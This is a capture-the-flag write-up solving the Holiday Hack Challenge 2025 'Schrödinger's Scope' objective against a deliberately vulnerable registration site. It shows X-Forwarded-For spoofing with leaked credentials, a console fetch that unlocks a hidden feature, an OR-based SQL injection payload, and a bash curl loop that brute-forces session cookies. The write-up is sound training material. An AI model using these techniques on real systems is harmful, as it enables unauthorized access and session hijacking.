|[Previous Objective](HHC_2025_Template/act3_hackagnome_mjd.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [Next Objective](HHC_2025_Template/act3_frosty_snowglobe_machine_mjd.html)
| :----------------------- | :--------------------------------: | --------------------------------: |

| Objective: Schrödinger's Scope   | Difficulty Level: 3 |
| :-----------------------: | :--------------------------: |
| Kevin in the Retro Store ponders pentest paradoxes—can you solve Schrödinger's Scope?| Location: Retro Store  |

## Solution Overview

The objective is to conduct a penetration test of a Neighborhood College Registration system. The test is scoped to a specific path of the application, accessing other paths is limited by an active monitoring system. When a threshold is reached, the engagement is reset. This resets the cookies that track the session and achievements. When this occurs, any vulnerabilities achieved are no longer logged and must be redone. The testing begins with reconnaisance of the application. Vulnerabilities are tested and exploited if possible.

| Activity           | Primary Tactic | MITRE ATT&CK Technique ID             | MITRE ATT&CK Technique Name |
| :-----------------------: | :--------------------------------: | :-----------------------: | :--------------------------------: |
| Developer information disclosure | Reconnaissance | T1592.004 | Gather Credentials |
| X-Forwarded-For exploit | Initial Access | T1190 | Exploit Public-Facing Application |
| Found commented code | Reconnaissance | T1595.002 | Vulnerability Scanning |
| SQL Injection | Initial Access | T1190 | Exploit Public-Facing Application |
| Unauthorized content | Discovery | T1083 | File and Directory Discovery |
| Cookie prediction | Credential Access | T1539 | Steal Web Session Cookie |

## Detailed Solution
<details>
<summary>Click to expand</summary>

The initial step was to identify the bot responsible for the additional scope violations
  
![Identification of WebBot](/images/shroedingers_webbot.jpg) 

With the object pattern identified, it is possible to use browser Developer Tools to block the request.
Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "*gnomeU*"

![Blocking of WebBot](/images/shroedingers_webbotblock.jpg) 

Reconnaisance began with examining the contents of the sitemap for the application.
The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934

```
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/ 
>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/ 
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
```
Exploring the endpoints revealed several pages of notes, two that were within the scope.
The first enpoint found: /register/dev/dev_todos

![Developer Information To Do List](/images/shroedingers_devtodos.jpg) 

The second endpoint found: /register/dev/dev_notes

![Developer Information Notes](/images/shroedingers_devnotes.jpg) 

Locating both of these files construct the Developer information disclosure vulnerability discovered.

**Answer: Developer information disclosure**

With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself. 

![Spoofing the X-Forwarder Header](/images/shroedingers_xforwarder.jpg) 

The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.

Spoofing the X-Forwarded-For header and authenticating as testuser achieves the second vulnerability.

**Answer: X-Forwarded-For exploit**

Examining the source code for the courses page, a commented secion of code is discovered.

![Commented Search Feature](/images/shroedingers_commentedsearch.jpg) 

Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:

```js
function checkAndReportCourseSearch() {
  const courseList = document.getElementById('courseSearch');
  if (courseList && !courseList.dataset.trapTriggered) {
    courseList.dataset.trapTriggered = "true";
    fetch('/register/courseSearchUnlocked', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Course search was uncommented!',
        timestamp: Date.now(),
        linkCount: courseList.querySelectorAll('a').length
      })
    })
```
Executing the following code in the Developer Console activates the code:

```js
fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: 'Course search was uncommented!', timestamp: Date.now(), linkCount: 1 }) }).then(r => r.text()).then(console.log)
```

This activates the search feature in the application:

![Activated Search Feature](/images/shroedingers_activatedsearch.jpg) 

**Answer: Found commented code**

Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.

![Search SQL Injection](/images/shroedingers_searchsqli.jpg) 

**Answer: SQL Injection**

This reveals the unauthorized course and allows me to report it:
![Unauthorized Course](/images/shroedingers_mischief.jpg)

Opening the course details prompts for reporting:
![Unauthorized Course Details](/images/shroedingers_gnomecourse.jpg) 

**Answer: Unauthorized content**

The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.

![Registration Value](/images/shroedingers_wipermissions.jpg) 

Looking at the registration values generated:

```
registration	eb72a05369dcb44d
registration	eb72a05369dcb44d
registration	eb72a05369dcb455
registration	eb72a05369dcb453
registration	eb72a05369dcb451
registration	eb72a05369dcb454
registration	eb72a05369dcb444
registration	eb72a05369dcb445
registration	eb72a05369dcb447
registration	eb72a05369dcb449
registration	eb72a05369dcb456
registration	eb72a05369dcb448
registration	eb72a05369dcb452
registration	eb72a05369dcb44a
registration	eb72a05369dcb443
```

Only the last two digits change, this indicates there are only 256 variations.
The TestUser needs to be logged in to test the registration values. 
Using this script to locate the valid session:

```sh
#!/bin/bash
prefix="eb72a05369dcb4"
schrod="7c3ee3a7-6781-459b-8db9-eee63c05558b"
id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"

for i in {0..255}; do
  hex=$(printf '%02x' $i)
  
  # Login and access page in one flow
  response=$(curl -s -L \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
    -d "username=teststudent&password=2025h0L1d4y5" \
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id" \
    --next \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")
  
  if ! echo "$response" | grep -qi "invalid"; then
    echo "============================================"
    echo "VALID REGISTRATION COOKIE FOUND!"
    echo "registration=${prefix}${hex}"
    echo "============================================"
    echo ""
    echo "$response"
    echo ""
    echo "============================================"
    echo "Response saved to: /tmp/valid_${hex}.html"
    echo "$response" > /tmp/valid_${hex}.html
    exit 0
  else
    echo -n "."
  fi
done

echo ""
echo "No valid registration cookie found in range 00-ff"
```

This results in a VALID REGISTRATION COOKIE FOUND!
registration=eb72a05369dcb44c

Hijacking this session token, the document in wip is accessed.
 
**Answer: Cookie prediction**

![Final Assessment Results](/images/shroedingers_final.jpg) 

</details>

## Tools Reference

| Tools Used           | Tool Version |
| :-----------------------: | :--------------------------------: |
| Edge Developer Tools | Version 142.0.3595.53 | 
| Burpsuite Community Edition | v2024.11.2 |


## Hints Reference
| Provided By         | Hint |
| :-----------------------: | :--------------------------------: |
| Santa | Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi. |
| Santa | Watch out for tiny, pesky gnomes who may be violating your progess. If you find one, figure out how they are getting into things and consider matching and replacing them out of your way. |
| Santa | As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path. |
| Santa | During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a sitemap can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values |
| Santa | Pay close attention to the instructions and be very wary of advice from the tongues of gnomes! Perhaps not ignore everything, but be careful! |

## Acknowledgements
| Provided By         | Notes |
| :-----------------------: | :--------------------------------: |
| khesperus | Provided a sanity check by confirming that I had all the elements to solve the objective |
| eucrates | Provided feedback on scope and avoiding rabbit holes |


|[Previous Objective](HHC_2025_Template/act3_hackagnome_mjd.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [Next Objective](HHC_2025_Template/act3_frosty_snowglobe_machine_mjd.html)
| :----------------------- | :--------------------------------: | --------------------------------: |
